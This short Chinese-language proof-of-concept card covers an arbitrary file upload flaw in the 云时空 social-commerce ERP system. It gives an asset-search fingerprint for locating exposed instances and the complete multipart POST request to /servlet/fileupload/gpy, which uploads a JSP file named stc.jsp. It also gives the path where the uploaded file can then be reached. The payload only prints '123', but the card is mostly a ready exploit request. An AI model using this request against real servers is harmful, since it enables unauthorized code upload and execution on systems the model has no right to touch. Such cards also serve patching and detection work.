# 云时空社会化商业ERP系统gpy任意文件上传漏洞

- **系统**：云时空社会化商业ERP系统gpy　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/static/plugin/lhgdialog/skins/default.css"`
- **请求**：`POST /servlet/fileupload/gpy HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A13…`　`Content-Length: 221`

**请求体 / payload**
```
--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="stc.jsp"
Content-Type: application/octet-stream
<% out.println("123"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--

上传文件位置\
2023-12-13，为响应时间
/uploads/pics/2023-12-13/stc.jsp
```

**其他**
- 云时空社会化商业ERP系统gpy任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 云时空社会化商业ERP